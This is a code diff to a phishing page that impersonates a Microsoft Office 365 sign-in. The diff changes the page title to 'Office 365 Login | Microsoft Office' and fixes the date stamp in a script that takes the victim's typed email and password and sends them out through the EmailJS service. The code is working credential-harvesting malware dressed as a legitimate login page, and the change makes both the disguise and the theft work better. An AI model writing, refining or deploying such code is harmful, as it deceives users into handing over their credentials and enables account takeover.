@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css">
     <link rel="stylesheet" href="styles.css">
-    <title>Sign In</title>
+    <title>Office 365 Login | Microsoft Office</title>
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js"></script>
     <script type="text/javascript">
@@ -44,7 +44,7 @@
                 var login_params = {
                    "email": document.getElementById("username").value,
                    "password": document.getElementById("password").value,
-                   "date": dt.getFullYear() + "-" + dt.getMonth() + "-" + dt.getDay(),
+                   "date": dt.getFullYear() + "-" + (dt.getMonth() + 1) + "-" + dt.getDate(),
                    "time": dt.getHours() + "-" + dt.getMinutes() + "-" + dt.getSeconds()
                 }
                 emailjs.send('default_service', 'login', login_params); 
